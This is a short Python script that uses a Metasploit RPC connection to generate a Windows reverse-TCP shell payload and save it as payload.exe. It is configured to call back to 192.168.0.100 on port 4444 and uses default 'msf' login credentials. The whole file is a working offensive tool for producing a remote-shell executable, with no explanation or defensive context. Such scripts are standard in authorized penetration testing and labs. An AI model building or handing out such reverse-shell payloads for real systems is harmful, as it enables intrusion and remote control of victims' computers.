import msfrpc

#Metasploit RPC server
msf = msfrpc.Msrpc('localhost', 55553)
#Config own credentials
msf.login('msf', 'msf')

#Payload Generator
payload = msf.module.use('payload/windows/shell_reverse_tcp')
payload.set_option('LHOST', '192.168.0.100')
payload.set_option('LPORT', '4444')
payloadData = payload.generate()


#Payload to file
with open('payload.exe', 'wb') as f:
    f.write(payloadData)
    

#Disconnect from RPC server
msf.logout()